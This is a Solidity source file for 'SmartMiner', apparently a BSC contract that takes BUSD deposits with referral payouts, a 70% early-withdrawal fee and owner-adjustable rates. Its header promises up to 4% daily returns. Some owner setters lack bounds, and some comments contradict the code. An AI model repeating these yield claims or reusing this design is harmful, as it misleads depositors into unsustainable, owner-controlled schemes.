/**
 *Submitted for verification at BscScan.com on 2022-08-09
*/

/**

rewards up to 4% Daily in BUSD.
8% Referral bonus that is instantly paid in BUSD to your wallet
5% Ecosystem tax
Sustainability features:
24 Hours earnings accumulation cut-Off (so 6-1 cannot be abused).
10 Mandatory compound feature (~ 6-1 with 2 compounds a day)
70% Contract Fee For early withdrawals that is locked in the TVL.

Benefits if you hold $SmartMiner tokens:
A stacking compound bonus up to 10%! When compounding every 12 hours you will go up a tier with each compound up to a maximum of 10! The maximum tier and compound step gives a 10% bonus. What tier you can reach depends on the on number of $SmartMiner tokens held:
*Tier 1: 5000 SmartMiner gives a stacking 0.1% compounding bonus with each compound up to 1%
*Tier 2: 15000 SmartMiner gives a stacking 0.2% compounding bonus with each compound up to 2%
*Tier 3: 22000 SmartMiner gives a stacking 0.3% compounding bonus with each compound up to 3%
*Tier 4: 34000 SmartMiner gives a stacking 0.5% compounding bonus with each compound up to 5%
*Tier 5: 68000 SmartMiner gives a stacking 1% compounding bonus with each compound up to 10%

An additional stacking 0.1% compounding bonus up to 1% is given as a loyalty bonus to anyone who holds over 100 SmartMiner tokens. This loyalty bonus stacks with the bonus tiers.
Extra Referral Bonuses based on the number of Beans on SmartMiner tokens held, increasing referral bonus to 9.2%!
Part of the miner tax will be used to buyback $SmartMiner and support the SmartMiner ecosystem

Earnings automation:
MINIMUM INITIAL DEPOSIT OF 250 BUSD REQUIRED! This does not have to be your first deposit but tallies all your non compounded deposits. You can enable/disable automation at any time.
You can choose automated compounding intervals between 12 and 24 hours. 12 hours is recommended if you hold $SmartMiner tokens for maximum bonus tier effectiveness
Automation will follow the 6+1 strategy: compounding for 6 days and claiming on 7th with no withdrawal penalty. All fully automatic, no input required.
Automation fee of 1% per compound/claim

*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

interface IToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }


  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface ITimerPool {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function update(
        uint256 _amount,
        uint256 _time,
        address _user
    ) external;
}

contract SmartMiner {
    using SafeMath for uint256;

    IToken public token_BUSD;
	//address erctoken = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7; /** BUSD Testnet **/
    address erctoken = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; /** BUSD Mainnet **/

    bool public enabled = false;


    
    uint256 public QUBIC_TO_HIRE_1MINERS = 2160000;  // 4%
    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public REFERRAL = 80;
    uint256 public TAX = 50;
    uint256 public DEVTAX = 15;
    uint256 public MKTTAX = 25;
    uint256 public TIMETAX = 10;
    uint256 public AUTOTAX = 10;
    uint256 public MARKET_QUBIC_DIVISOR = 5; // 20%
    uint256 public MARKET_QUBIC_DIVISOR_SELL = 2; // 50%

    uint256 public MIN_INVEST_LIMIT = 5 * 1e18; /** 5 BUSD  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 20000 * 1e18; /** 20000 BUSD  **/
    uint256 public MIN_AUTOMATE_DEPOSIT = 250 * 1e18; /** 250 BUSD */

	uint256 public COMPOUND_BONUS_MAX_TIMES = 10; /** 10 times / 5 days. **/
    uint256 public COMPOUND_STEP = 12 * 60 * 60; /** every 12 hours. **/

    uint256 public WITHDRAWAL_TAX = 700; //, 700 = 70%
    uint256 public COMPOUND_FOR_NO_TAX_WITHDRAWAL = 10; // compound for no tax withdrawal.

    uint256 public totalStaked;
    uint256 public totalDeposits;
    uint256 public totalCompound;
    uint256 public totalRefBonus;
    uint256 public totalWithdrawn;

    uint256 public marketQubic;
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    bool public contractStarted;

	uint256 public CUTOFF_STEP = 24 * 60 * 60; /** 24 hours  **/

    address public owner;
    address public devadr;
    address public mktadr;
    address public autoadr;


    address public defaultaddress;

    uint256 goldvalue =  5000 * 1e18;
    uint256 platinumvalue =  15000 * 1e18;
    uint256 platinumhonorvalue =  22000 * 1e18;
    uint256 diamondvalue =  34000 * 1e18;
    uint256 diamondhonorvalue = 68000 * 1e18;

    uint256 goldbonus = 1;
    uint256 platinumbonus = 2;
    uint256 platinumhonorbonus = 3;
    uint256 diamondbonus = 5;
    uint256 diamondhonorbonus = 10;


    IBEP20 quantic = IBEP20(0xEf795b3025608A599868aB5Cb03dbb6e1c67c979);
        
    address[] partnerships;

    
    mapping (address => uint256) partnershipIndexes;

    struct Partner {
        uint256 min_amount;
        uint256 bonus;
    }

    mapping(address => Partner) public partners;

    struct User {
        uint256 initialDeposit;
        uint256 userDeposit;
        uint256 miners;
        uint256 claimedQubic;
        uint256 lastCompound;
        address referrer;
        uint256 referralsCount;
        uint256 referralQubicRewards;
        uint256 totalWithdrawn;
        uint256 dailyCompoundBonus;
        uint256 lastWithdrawTime;


        uint256 autoCompoudBonus;

    }

    mapping(address => User) public users;



    address[] automate;
    mapping (address => uint256) automateIndexes;
    uint256 lastAutomateCallTime;
    address previousCaller;

    struct Automation {
        uint256 day;
        uint256 runhours;
        uint256 dayrun;
        uint256 lastrun;
    }

    mapping(address => Automation) public automations;

    ITimerPool timer;


    constructor(address _devadr, address _mktadr, address _autoadr, address _defaultaddress, ITimerPool _timer) {
		require(!isContract(_devadr) && !isContract(_mktadr) && !isContract(_autoadr));
        owner = msg.sender;
        devadr = _devadr;
        mktadr = _mktadr;
        autoadr = _autoadr;
        defaultaddress = _defaultaddress;
        token_BUSD = IToken(erctoken);
        timer = _timer;
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function getQuanticBalance(address adr) public view returns(uint256) {
        return quantic.balanceOf(address(adr));
    }

    function getBonusQuantic(address adr) public view returns(uint256) {
         if(quantic.balanceOf(address(adr)) >= diamondhonorvalue){
            return diamondhonorbonus;
        }
        else if(quantic.balanceOf(address(adr)) >= diamondvalue){
            return diamondbonus;
        }
        else if(quantic.balanceOf(address(adr)) >= platinumhonorvalue) {
            return platinumhonorbonus;
        }
        else if(quantic.balanceOf(address(adr))>= platinumvalue){
            return platinumbonus;
        }
        else if(quantic.balanceOf(address(adr))>= goldvalue){
            return goldbonus;
        }
        else
            return 0;
    }

    function Compound(bool isCompound) public {
        User storage user = users[msg.sender];
        require(contractStarted, "Contract not yet Started.");
        require(automations[msg.sender].day < 1, "Holder is automated!");

        uint256 qubicUsed = getMyQubic();
        uint256 qubicForCompound = qubicUsed;

        if(isCompound) {
            uint256 dailyCompoundBonus = getDailyCompoundBonus(msg.sender, qubicForCompound);
            qubicForCompound = qubicForCompound.add(dailyCompoundBonus);
            uint256 qubicUsedValue = calculateQubicSell(qubicForCompound);
            user.userDeposit = user.userDeposit.add(qubicUsedValue);
            totalCompound = totalCompound.add(qubicUsedValue);
        } 

        if(block.timestamp.sub(user.lastCompound) >= COMPOUND_STEP) {
            if(user.dailyCompoundBonus < COMPOUND_BONUS_MAX_TIMES) {
                user.dailyCompoundBonus = user.dailyCompoundBonus.add(1);
            }
        }

        if(user.dailyCompoundBonus.div(14) == 1)
        {
            user.miners = user.miners.add(qubicForCompound.div(1920000));
        }else if(user.dailyCompoundBonus.div(14) == 2){
            user.miners = user.miners.add(qubicForCompound.div(1728000));
        }else if(user.dailyCompoundBonus.div(14) == 3){
            user.miners = user.miners.add(qubicForCompound.div(1580000));
        }else if(user.dailyCompoundBonus.div(14) == 4){
            user.miners = user.miners.add(qubicForCompound.div(1440000));
        }else if(user.dailyCompoundBonus.div(14) > 4){
            user.miners = user.miners.add(qubicForCompound.div(1235000));
        }else{
            user.miners = user.miners.add(qubicForCompound.div(QUBIC_TO_HIRE_1MINERS));
        }
        
        
        user.claimedQubic = 0;
        user.lastCompound = block.timestamp;
        marketQubic = marketQubic.add(qubicUsed.div(MARKET_QUBIC_DIVISOR));
    }

    function compoundAutoQubic(address adr, bool isCompound) internal {
        User storage user = users[adr];
         
        uint256 qubicUsed = users[adr].claimedQubic.add(getQubicSinceLastCompound(adr));
        uint256 qubicForCompound = qubicUsed;

        if(isCompound) {
            uint256 dailyCompoundBonus = getDailyCompoundBonus(adr, qubicForCompound);
            qubicForCompound = qubicForCompound.add(dailyCompoundBonus);
            uint256 qubicUsedValue = calculateQubicSell(qubicForCompound);
            qubicUsedValue = qubicUsedValue - payAuto(qubicUsedValue);
            qubicForCompound = qubicForCompound - qubicForCompound.mul(AUTOTAX).div(PERCENTS_DIVIDER);
            user.userDeposit = user.userDeposit.add(qubicUsedValue);
            totalCompound = totalCompound.add(qubicUsedValue);
        } 

        if(block.timestamp.sub(user.lastCompound) >= COMPOUND_STEP) {
            if(user.dailyCompoundBonus < COMPOUND_BONUS_MAX_TIMES) {
                user.dailyCompoundBonus = user.dailyCompoundBonus.add(1);
            }
        }
        
        if(user.dailyCompoundBonus.div(14) == 1)
        {
            user.miners = user.miners.add(qubicForCompound.div(1920000));
        }else if(user.dailyCompoundBonus.div(14) == 2){
            user.miners = user.miners.add(qubicForCompound.div(1728000));
        }else if(user.dailyCompoundBonus.div(14) == 3){
            user.miners = user.miners.add(qubicForCompound.div(1580000));
        }else if(user.dailyCompoundBonus.div(14) == 4){
            user.miners = user.miners.add(qubicForCompound.div(1440000));
        }else if(user.dailyCompoundBonus.div(14) > 4){
            user.miners = user.miners.add(qubicForCompound.div(1235000));
        }else{
            user.miners = user.miners.add(qubicForCompound.div(QUBIC_TO_HIRE_1MINERS));
        }
        user.claimedQubic = 0;
        user.lastCompound = block.timestamp;

        marketQubic = marketQubic.add(qubicUsed.div(MARKET_QUBIC_DIVISOR));
    }

    function Sell() public{
        require(contractStarted);
        require(automations[msg.sender].day < 1, "Holder is automated!");
        User storage user = users[msg.sender];
        uint256 hasQubic = getMyQubic();
        uint256 qubicValue = calculateQubicSell(hasQubic);
        
        
            //if user compound < to mandatory compound days
        if(user.dailyCompoundBonus < COMPOUND_FOR_NO_TAX_WITHDRAWAL){
            //daily compound bonus count will not reset and qubicValue will be deducted with 60% feedback fee.
            qubicValue = qubicValue.sub(qubicValue.mul(WITHDRAWAL_TAX).div(PERCENTS_DIVIDER));
        }else{
            //set daily compound bonus count to 0 and qubicValue will remain without deductions
             user.dailyCompoundBonus = 0;   
        }
        
        user.lastWithdrawTime = block.timestamp;
        user.claimedQubic = 0;  
        user.lastCompound = block.timestamp;
        marketQubic = marketQubic.add(hasQubic.div(MARKET_QUBIC_DIVISOR_SELL));
        
        if(getBalance() < qubicValue) {
            qubicValue = getBalance();
        }

        uint256 qubicPayout = qubicValue.sub(payFees(qubicValue));
        token_BUSD.transfer(msg.sender, qubicPayout);
        user.totalWithdrawn = user.totalWithdrawn.add(qubicPayout);
        totalWithdrawn = totalWithdrawn.add(qubicPayout);
    }

    function sellAutoQubic(address adr) internal {
        User storage user = users[adr];
        uint256 hasQubic = users[adr].claimedQubic.add(getQubicSinceLastCompound(adr));
        uint256 qubicValue = calculateQubicSell(hasQubic);

        user.dailyCompoundBonus = 0;  
        user.lastWithdrawTime = block.timestamp;
        user.claimedQubic = 0;  
        user.lastCompound = block.timestamp;
        marketQubic = marketQubic.add(hasQubic.div(MARKET_QUBIC_DIVISOR_SELL));
        
        if(getBalance() < qubicValue) {
            qubicValue = getBalance();
        }

        uint256 qubicPayout = qubicValue.sub(payFees(qubicValue));
        qubicPayout = qubicPayout.sub(payAuto(qubicValue));

        
        token_BUSD.transfer(adr, qubicPayout);
        user.totalWithdrawn = user.totalWithdrawn.add(qubicPayout);
        totalWithdrawn = totalWithdrawn.add(qubicPayout);
    }

    function Buy(address ref, uint256 amount) public{
        require(contractStarted);
        User storage user = users[msg.sender];
        require(automations[msg.sender].day < 1, "Holder is automated!");

        require(amount >= MIN_INVEST_LIMIT, "Mininum investment not met.");
        require(user.initialDeposit.add(amount) <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");

        if(enabled == false) {
            require(ref == defaultaddress, 'referral address is incorrect');
        }
        
        token_BUSD.transferFrom(address(msg.sender), address(this), amount);
        uint256 qubicBought = calculateQubicBuy(amount, getBalance().sub(amount));
        user.userDeposit = user.userDeposit.add(amount);
        user.initialDeposit = user.initialDeposit.add(amount);
        user.claimedQubic = user.claimedQubic.add(qubicBought);

        if (ref == address(0) || ref == address(0x000000000000000000000000000000000000dEaD)) {
            user.referrer = defaultaddress;
        }else{
            user.referrer = ref;
            address upline1 = user.referrer;
            if (upline1 != address(0)) {
                users[upline1].referralsCount = users[upline1].referralsCount.add(1);
            }
        }
        address upline = user.referrer;
        if (upline != address(0)) {
            uint256 refRewards = amount.mul(REFERRAL+getBonusQuantic(user.referrer)+getBonusPartnership(user.referrer)).div(PERCENTS_DIVIDER);
            token_BUSD.transfer(upline, refRewards);
            users[upline].referralQubicRewards = users[upline].referralQubicRewards.add(refRewards);
            totalRefBonus = totalRefBonus.add(refRewards);
        }

        uint256 qubicPayout = payFees(amount);
        timer.update(amount.mul(TIMETAX).div(PERCENTS_DIVIDER), block.timestamp, msg.sender);

        /** less the fee on total Staked to give more transparency of data. **/
        totalStaked = totalStaked.add(amount.sub(qubicPayout));
        totalDeposits = totalDeposits.add(1);
        Compound(false);
    }

    function payFees(uint256 qubicValue) internal returns(uint256){
        uint256 tax = qubicValue.mul(TAX).div(PERCENTS_DIVIDER);
        token_BUSD.transfer(devadr, qubicValue.mul(DEVTAX).div(PERCENTS_DIVIDER));
        token_BUSD.transfer(mktadr, qubicValue.mul(MKTTAX).div(PERCENTS_DIVIDER));
        token_BUSD.transfer(address(timer), qubicValue.mul(TIMETAX).div(PERCENTS_DIVIDER));
        return tax.mul(1);
    }

    function payAuto(uint256 qubicValue) internal returns(uint256){
        uint256 tax = qubicValue.mul(AUTOTAX).div(PERCENTS_DIVIDER);
         token_BUSD.transfer(autoadr, qubicValue.mul(AUTOTAX).div(PERCENTS_DIVIDER));
         return tax.mul(1);
    }

    function getDailyCompoundBonus(address _adr, uint256 amount) public view returns(uint256){
        if(users[_adr].dailyCompoundBonus == 0) {
            return 0;
        } else {
            uint256 totalBonus = users[_adr].dailyCompoundBonus.mul(getBonusQuantic(_adr)+getBonusPartnership(_adr)).add(users[_adr].autoCompoudBonus);
            uint256 result = amount.mul(totalBonus).div(PERCENTS_DIVIDER);
            return result;
        }
    }

    function getUserInfo(address _adr) public view returns(uint256 _initialDeposit, uint256 _userDeposit, uint256 _miners,
     uint256 _claimedQubic, uint256 _lastCompound, address _referrer, uint256 _referrals,
	 uint256 _totalWithdrawn, uint256 _referralQubicRewards, uint256 _dailyCompoundBonus, uint256 _lastWithdrawTime) {
         _initialDeposit = users[_adr].initialDeposit;
         _userDeposit = users[_adr].userDeposit;
         _miners = users[_adr].miners;
         _claimedQubic = users[_adr].claimedQubic;
         _lastCompound = users[_adr].lastCompound;
         _referrer = users[_adr].referrer;
         _referrals = users[_adr].referralsCount;
         _totalWithdrawn = users[_adr].totalWithdrawn;
         _referralQubicRewards = users[_adr].referralQubicRewards;
         _dailyCompoundBonus = users[_adr].dailyCompoundBonus;
         _lastWithdrawTime = users[_adr].lastWithdrawTime;
	}

    function initialize(uint256 amount) public{
        if (!contractStarted) {
    		if (msg.sender == owner) {
    		    require(marketQubic == 0);
    			contractStarted = true;
                marketQubic = 86400000000;
                Buy(msg.sender, amount);
    		} else revert("Contract not yet started.");
    	}
    }

    function getBalance() public view returns (uint256) {
        return token_BUSD.balanceOf(address(this));
	}

    function getTimeStamp() public view returns (uint256) {
        return block.timestamp;
    }

    function getAvailableEarnings(address _adr) public view returns(uint256) {
        uint256 userQubic = users[_adr].claimedQubic.add(getQubicSinceLastCompound(_adr));
        return calculateQubicSell(userQubic);
    }

    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        return SafeMath.div(SafeMath.mul(PSN, bs), SafeMath.add(PSNH, SafeMath.div(SafeMath.add(SafeMath.mul(PSN, rs), SafeMath.mul(PSNH, rt)), rt)));
    }

    function calculateQubicSell(uint256 qubic) public view returns(uint256){
        return calculateTrade(qubic, marketQubic, getBalance());
    }

    function calculateQubicBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth, contractBalance, marketQubic);
    }

    function calculateQubicBuySimple(uint256 eth) public view returns(uint256){
        return calculateQubicBuy(eth, getBalance());
    }

    function getQubicYield(uint256 amount) public view returns(uint256,uint256) {
        uint256 qubicAmount = calculateQubicBuy(amount , getBalance().add(amount).sub(amount));
        uint256 miners = qubicAmount.div(QUBIC_TO_HIRE_1MINERS);
        uint256 day = 1 days;
        uint256 qubicPerDay = day.mul(miners);
        uint256 earningsPerDay = calculateQubicSellForYield(qubicPerDay, amount);
        return(miners, earningsPerDay);
    }

    function calculateQubicSellForYield(uint256 qubic,uint256 amount) public view returns(uint256){
        return calculateTrade(qubic,marketQubic, getBalance().add(amount));
    }

    function getSiteInfo() public view returns (uint256 _totalStaked, uint256 _totalDeposits, uint256 _totalCompound, uint256 _totalRefBonus) {
        return (totalStaked, totalDeposits, totalCompound, totalRefBonus);
    }

    function getMyMiners() public view returns(uint256){
        return users[msg.sender].miners;
    }

    function getMyQubic() public view returns(uint256){
        return users[msg.sender].claimedQubic.add(getQubicSinceLastCompound(msg.sender));
    }

    function getQubicSinceLastCompound(address adr) public view returns(uint256){
        uint256 secondsSinceLastCompound = block.timestamp.sub(users[adr].lastCompound);
                            /** get min time. **/
        uint256 cutoffTime = min(secondsSinceLastCompound, CUTOFF_STEP);
        uint256 secondsPassed = min(QUBIC_TO_HIRE_1MINERS, cutoffTime);
        return secondsPassed.mul(users[adr].miners);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function REMOVE_PARTNERSHIP(address partnership) external {
        require(msg.sender == owner, "Admin use only.");
        partnerships[partnershipIndexes[partnership]] = partnerships[partnerships.length-1];
        partnershipIndexes[partnerships[partnerships.length-1]] = partnershipIndexes[partnership];
        partnerships.pop();
        delete partners[partnership];

    }
   
    function ADD_PARTNERSHIP(address partnership, uint256 minamount, uint256 bonus) external {
        require(msg.sender == owner, "Admin use only.");
        partnershipIndexes[partnership] = partnerships.length;
        partnerships.push(partnership);

        partners[partnership].bonus = bonus;
        partners[partnership].min_amount = minamount;
    }

    function CHANGE_PARTNERSHIP(address partnership, uint256 minamount, uint256 bonus) external {
        require(msg.sender == owner, "Admin use only.");

        partners[partnership].bonus = bonus;
        partners[partnership].min_amount = minamount;
    }


    function getBonusPartnership(address adr) public view returns(uint256) {
        uint256 partnershipCount = partnerships.length;
        if(partnershipCount == 0) { return 0; }

        uint256 iterations = 0;
        uint256 bonus = 0;

        while(iterations < partnershipCount) {
            IBEP20 partner = IBEP20(partnerships[iterations]);
            if(partner.balanceOf(address(adr)) >= partners[partnerships[iterations]].min_amount ) {
                if(partners[partnerships[iterations]].bonus > bonus) {
                    bonus = partners[partnerships[iterations]].bonus;
                }
            }
            iterations++;
        }
        return bonus;
    }

    function getPartnershipCount() public view returns(uint256) {
        return partnerships.length;
    }

    function verifyPartnership(address token) public view returns(uint256) {
        uint256 partnershipCount = partnerships.length;
        if(partnershipCount == 0) { return 0; }

        uint256 iterations = 0;

        while(iterations < partnershipCount) {
            address partner = partnerships[iterations];
            if(partner == token) {return 1;}
            iterations++;
        }
        return 0;
    }

    function ADD_AUTOMATE(uint256 hrs) external {
        require(contractStarted);
        require(automations[msg.sender].day == 0, "Address already exists!");
        require(hrs >= 4 && hrs <= 24, "Hours are not correct!");
        require(users[msg.sender].initialDeposit >= MIN_AUTOMATE_DEPOSIT, "deposit more than min!");

        automateIndexes[msg.sender] = automate.length;
        automate.push(msg.sender);

        automations[msg.sender].day = 1;
        automations[msg.sender].runhours = hrs;
        automations[msg.sender].lastrun = block.timestamp;
        automations[msg.sender].dayrun = block.timestamp;
    }

    function REMOVE_AUTOMATE() external {
        require(contractStarted);
        require(automations[msg.sender].day >= 1, "Address doesn't exists!");
        automate[automateIndexes[msg.sender]] = automate[automate.length-1];
        automateIndexes[automate[automate.length-1]] = automateIndexes[msg.sender];
        automate.pop();
        delete automations[msg.sender];
    }

    function getAutomateCounts() public view returns(uint256) {
        return automate.length;
    }

    function runAutomate() external {
        require(contractStarted);
        require(users[msg.sender].initialDeposit >= MIN_AUTOMATE_DEPOSIT, "deposit more than min!");
        uint256 automateCount = automate.length;
        require(block.timestamp - lastAutomateCallTime >= 12 hours, 'You can call 12 hours later');
        require(msg.sender != previousCaller, 'You can not call this function in a row');
        previousCaller = msg.sender;

        if(users[msg.sender].autoCompoudBonus < 5)
        {
            users[msg.sender].autoCompoudBonus = users[msg.sender].autoCompoudBonus.add(1);
        }


        uint256 iterations = 0;
        while(iterations < automateCount) {
            address adr = automate[iterations];
            uint256 hasQubic = users[adr].claimedQubic.add(getQubicSinceLastCompound(adr));
            if(hasQubic > 0){
                if ((block.timestamp - automations[adr].lastrun) >= (automations[adr].runhours*3600)) {  //86400=24hrs, 3600=1hr, 7200=2hr, 10800=3rs, 14400=4hrs 21600=6hrs, 43200=12hrs, 64800=18
                    if(automations[adr].day == 7 && ((block.timestamp - automations[adr].dayrun) >= (24*3600))) {
                        automations[adr].day = 1;
                        automations[adr].lastrun = automations[adr].lastrun + (automations[adr].runhours*3600);
                        automations[adr].dayrun = automations[adr].dayrun + (24*3600);
                        sellAutoQubic(adr);
                    }
                    else {
                        if(automations[adr].day<7) {
                            compoundAutoQubic(adr,true);
                        }
                        if((block.timestamp - automations[adr].dayrun) >= (24*3600)) {
                            automations[adr].day++;
                            automations[adr].dayrun = automations[adr].dayrun + (24*3600);
                        }
                       automations [adr].lastrun = automations[adr].lastrun + (automations[adr].runhours*3600);
                    }
                }
            }
            iterations++;
        }
        lastAutomateCallTime = block.timestamp;
    }    

    function CHANGE_TIERBONUS(uint256 dh, uint256 d,uint256 ph, uint256 p,uint256 g) external {
        require(msg.sender == owner, "Admin use only.");
        diamondhonorbonus = dh;
        diamondbonus = d;
        platinumhonorbonus = ph;
        platinumbonus = p;
        goldbonus = g;
    }

    function CHANGE_TIERS(uint256 dh, uint256 d,uint256 ph, uint256 p,uint256 g) external {
        require(msg.sender == owner, "Admin use only.");
        diamondhonorvalue = dh;
        diamondvalue = d;
        platinumhonorvalue = ph;
        platinumvalue = p;
        goldvalue = g;
    }

    function CHANGE_QUANTIC(IBEP20 value) external {
        require(msg.sender == owner, "Admin use only.");
         quantic = value;
    }

    /** wallet addresses setters **/
    function CHANGE_OWNERSHIP(address value) external {
        require(msg.sender == owner, "Admin use only.");
        owner = value;
    }

    function CHANGE_DEV_WALLET(address value) external {
        require(msg.sender == devadr, "Admin use only.");
        devadr = value;
    }

    function CHANGE_MKT_WALLET(address value) external {
        require(msg.sender == owner, "Admin use only.");
        mktadr = value;
    }

    function CHANGE_AUTO_WALLET(address value) external {
        require(msg.sender == owner, "Admin use only.");
        autoadr = value;
    }

    /** percentage setters, MAIN TAX CANNOT BE SET HIGHER THAN 6% **/

    // 2592000 - 3%, 2160000 - 4%, 1728000 - 5%, 1440000 - 6%, 1200000 - 7%, 1080000 - 8%
    // 959000 - 9%, 864000 - 10%, 720000 - 12%, 575424 - 15%, 540000 - 16%, 479520 - 18%
    
    function PRC_QUBIC_TO_HIRE_1MINERS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 479520 && value <= 2592000); /** min 3% max 12%**/
        QUBIC_TO_HIRE_1MINERS = value;
    }

    function PRC_TAX(uint256 t, uint256 m) external {
        require(msg.sender == owner, "Admin use only.");
        require(m <= 30); /** 6% max **/
        TAX = t;
        MKTTAX = m;
    }    

    function DEV_TAX(uint256 d) external {
        require(msg.sender == devadr, "Admin use only.");
        require(d <= 20); /** 6% max **/
        DEVTAX = d;
    }    

    function PRC_REFERRAL(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 100); /** 10% max **/
        REFERRAL = value;
    }
	
	  
    function SET_COMPOUND_FOR_NO_TAX_WITHDRAWAL(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        COMPOUND_FOR_NO_TAX_WITHDRAWAL = value;
    }

    function BONUS_DAILY_COMPOUND_BONUS_MAX_TIMES(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 30);
        COMPOUND_BONUS_MAX_TIMES = value;
    }

    function BONUS_COMPOUND_STEP(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        COMPOUND_STEP = value * 60 * 60;
    }

    function SET_WALLET_DEPOSIT_LIMIT(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value >= 20);  /** 20k busd minimum cap **/
        WALLET_DEPOSIT_LIMIT = value * 1e18;
    }


    function enableNormalBuy(bool value) external {
        require(msg.sender == owner, "Admin use only");
        enabled = value;
    }

    function setDefaultAddress(address value) external {
        require(msg.sender == owner, "Admin use only.");
        defaultaddress = value;
    }
	
}